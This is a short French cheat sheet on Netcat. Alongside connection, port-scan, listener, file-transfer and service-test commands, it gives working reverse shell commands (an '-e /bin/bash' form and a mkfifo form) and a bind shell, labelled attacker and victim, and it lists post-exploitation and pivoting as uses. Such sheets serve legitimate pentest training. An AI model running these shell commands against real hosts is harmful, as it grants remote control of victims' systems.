# Netcat (nc) – Swiss Army Knife Réseau

## 🎯 Objectif
Netcat est un outil polyvalent permettant de :
- Ouvrir des connexions réseau
- Écouter sur des ports
- Transférer des fichiers
- Déboguer des services
- Créer des shells (reverse / bind)

---

## 🔧 Commandes de base

### Connexion à un service
nc 192.168.1.10 80

### Scan simple de port
nc -zv 192.168.1.10 1-1000

---

## 🎧 Mode écoute (serveur)

### Écouter sur un port
nc -lvp 4444

Options :
-l   listen  
-v   verbose  
-p   port  

---

## 🐚 Reverse Shell

### Côté attaquant
nc -lvp 4444

### Côté victime
nc 192.168.1.20 4444 -e /bin/bash

⚠️ Option -e parfois désactivée (sécurité).

---

## 🐚 Reverse Shell (sans -e)

### Victime
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.20 4444 > /tmp/f

---

## 🔗 Bind Shell

### Victime
nc -lvp 4444 -e /bin/bash

### Attaquant
nc 192.168.1.10 4444

---

## 📁 Transfert de fichiers

### Réception
nc -lvp 4444 > fichier.txt

### Envoi
nc 192.168.1.20 4444 < fichier.txt

---

## 🧪 Test de services

### HTTP
echo -e "GET / HTTP/1.1\nHost: target\n\n" | nc target.com 80

### SMTP
nc mail.target.com 25

---

## 🧠 Cas d’usage typiques
- Debug réseau
- Post-exploitation
- Pivot réseau
- Test de firewall
- Transfert rapide de fichiers

---

## ⚠️ Sécurité
Netcat peut être détecté par les antivirus / EDR.
Utilisation à des fins légales uniquement.

---

## 🧩 Alternatives
- ncat (Nmap)
- socat
- bash /dev/tcp